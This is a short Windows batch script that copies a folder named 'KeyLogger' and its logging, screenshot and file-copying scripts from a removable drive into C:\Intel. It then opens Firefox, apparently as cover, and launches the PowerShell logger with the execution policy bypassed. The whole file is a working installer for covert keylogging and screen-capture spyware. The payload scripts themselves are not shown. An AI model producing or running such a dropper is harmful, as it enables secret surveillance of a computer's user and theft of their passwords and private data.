@echo off
for %%L in (D E F G H) do xcopy "%%L:\KeyLogger\Intel" "C:\Intel" /Y
for %%L in (D E F G H) do xcopy "%%L:\KeyLogger\script\log.ps1" "C:\Intel" /Y
for %%L in (D E F G H) do xcopy "%%L:\KeyLogger\script\script.ps1" "C:\Intel" /Y
for %%L in (D E F G H) do xcopy "%%L:\KeyLogger\script\screen shot.bat" "C:\Intel" /Y
for %%L in (D E F G H) do xcopy "%%L:\KeyLogger\script\copie.bat" "C:\Intel" /Y
start "" "firefox.exe"
start "" powershell -ExecutionPolicy Bypass -File "C:\Intel\log.ps1"
start "" "C:\Intel\screen shot.bat"
start "" "C:\Intel\copie.bat"